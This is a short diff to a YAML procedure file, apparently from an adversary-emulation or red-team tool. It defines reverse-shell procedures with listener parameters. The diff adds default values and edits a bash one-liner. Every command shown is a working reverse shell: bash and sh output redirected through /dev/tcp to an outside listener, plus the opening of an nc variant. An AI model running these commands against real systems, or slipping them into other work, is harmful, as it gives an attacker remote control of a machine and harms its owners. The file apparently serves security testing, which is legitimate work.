@@ -11,13 +11,15 @@ preconditions:
 parameters:
   LISTENER:
     type: string
+    default: ${LISTENER}
     description: the URL of the listener catching the reverse shell
   LISTENER_PORT:
     type: int
+    default: ${LISTENER_PORT}
     description: the listing port number
 procedures:
   - key: bash
-    command: bash >& /dev/tcp/${LISTENER}/${LISTENER_PORT} 0>&1 &
+    command: bash >& /dev/tcp/${LISTENER}/${LISTENER_PORT} 0>&1
   - key: sh
     command: sh -i >& /dev/tcp/${LISTENER}/${LISTENER_PORT} 0>&1
   - key: nc
